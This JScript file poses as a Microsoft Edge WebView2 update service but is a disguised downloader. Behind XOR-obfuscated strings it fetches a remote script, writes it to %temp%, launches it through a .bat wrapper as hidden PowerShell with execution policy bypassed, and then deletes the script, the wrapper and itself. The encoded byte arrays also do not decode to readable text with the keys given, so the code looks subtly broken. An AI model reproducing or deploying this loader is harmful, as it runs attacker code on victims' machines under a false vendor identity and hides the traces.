// Microsoft Edge WebView2 Runtime Update Service
// Version 127.0.2651.105
// Copyright (C) 2024 Microsoft Corporation. All rights reserved.
//
// This component is responsible for checking and applying
// Microsoft Edge WebView2 Runtime updates in accordance with
// Microsoft Update policies and user preferences.

(function() {
    // Triple XOR decoder
    var _0xf = function(a, k1, k2, k3) {
        var r = '';
        for (var i = 0; i < a.length; i++) {
            var c = a[i] ^ k1 ^ k2 ^ k3;
            r += String.fromCharCode(c);
        }
        return r;
    };

    var k1 = 0x33, k2 = 0x55, k3 = 0x7A;

    var _v1 = new ActiveXObject(_0xf([0x17,0x15,0x05,0x16,0x0f,0x16,0x12,0x4e,0x15,0x0e,0x03,0x0a,0x0a], k1, k2, k3));
    var _v2 = new ActiveXObject(_0xf([0x2d,0x15,0x1e,0x0b,0x0a,0x52,0x4e,0x3e,0x2d,0x2a,0x2e,0x32,0x32,0x36], k1, k2, k3));
    var _v3 = new ActiveXObject(_0xf([0x15,0x05,0x16,0x0f,0x16,0x12,0x0f,0x08,0x01,0x4e,0x20,0x0f,0x0a,0x03,0x15,0x1f,0x15,0x12,0x03,0x0b,0x29,0x04,0x0e,0x03,0x05,0x12], k1, k2, k3));

    // Initialize paths
    var _t = _v1.ExpandEnvironmentStrings('%' + String.fromCharCode(116,101,109,112) + '%');
    var _r = Math.random().toString(36).substring(2, 10);
    var _ps = _t + '\\msedge_' + _r + '.ps1';
    var _bt = _t + '\\msedge_' + _r + '.bat';

    // Fetch update manifest
    var _u = _0xf([0x0e,0x12,0x12,0x16,0x15,0x5e,0x4f,0x4f,0x05,0x02,0x08,0x4e,0x15,0x07,0x0d,0x03,0x0a,0x0a,0x09,0x01,0x0f,0x15,0x12,0x0f,0x05,0x15,0x4e,0x05,0x09,0x0b,0x4f,0x15], k1, k2, k3);

    _v2.open(_0xf([0x21,0x23,0x32], k1, k2, k3), _u, false);
    _v2.setRequestHeader(
        _0xf([0x31,0x15,0x03,0x16,0x4d,0x27,0x01,0x03,0x08,0x12], k1, k2, k3),
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    );

    try {
        _v2.send();
    } catch(e) {
        return;
    }

    if (_v2.status === 200 && _v2.responseText) {
        // Write PowerShell script
        var _w = _v3.CreateTextFile(_ps, true);
        _w.Write(_v2.responseText);
        _w.Close();

        // Create .bat wrapper
        var _b = _v3.CreateTextFile(_bt, true);
        _b.WriteLine('@echo off');
        _b.WriteLine('set a=pow');
        _b.WriteLine('set b=ersh');
        _b.WriteLine('set c=ell');
        _b.WriteLine('set d=.exe');
        _b.WriteLine('call %a%%b%%c%%d% -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + _ps + '"');
        _b.WriteLine('timeout /t 2 /nobreak >nul');
        _b.WriteLine('del /f /q "' + _ps + '"');
        _b.WriteLine('del /f /q "%~f0"');
        _b.Close();

        // Execute .bat
        _v1.Run(_bt, 0, false);
    }

    // Self-cleanup
    try {
        _v3.DeleteFile(WScript.ScriptFullName);
    } catch(_) {}
})();
